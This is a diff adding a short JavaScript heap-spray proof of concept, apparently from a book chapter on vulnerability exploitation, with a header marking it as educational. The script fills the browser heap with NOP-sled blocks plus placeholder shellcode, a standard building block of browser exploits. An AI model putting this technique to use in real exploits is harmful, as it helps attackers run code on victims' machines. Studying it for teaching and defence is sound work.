@@ -1,0 +1,38 @@
+<!-----------------------------------------------------------------------------------
+      To be the apostrophe which changed "Impossible" into "I'm possible"!
+		
+POC code of chapter 6 in book "Vulnerability Exploit and Analysis Technique"
+ 
+file name	: heap_spray.txt
+author		: failwest  
+date		: 2007.10.05
+description	: sample java script code for heap spray
+Noticed		: need to be run by browser    
+version		: 1.0
+E-mail		: failwest@gmail.com
+		
+	Only for educational purposes    enjoy the fun from exploiting :)
+--------------------------------------------------------------------------------------->
+
+<script language="javascript">
+var shellcode=unescape("....." ) ;
+var nop=unescape("%u9090%u9090");
+while (nop.length<= 0x100000/2)
+{
+	nop+=nop;
+}
+//generate 1MB memory block which full filled with "nop"
+
+//malloc header = 32 bytes
+//string length = 4  bytes
+//NULL terminator = 2 bytes
+//
+
+nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2 );
+var slide = new Array();//fill 200MB heap memory with our block
+for (var i=0; i<200; i++)
+{
+	slide[i] = nop + shellcode;
+}
+
+</script>
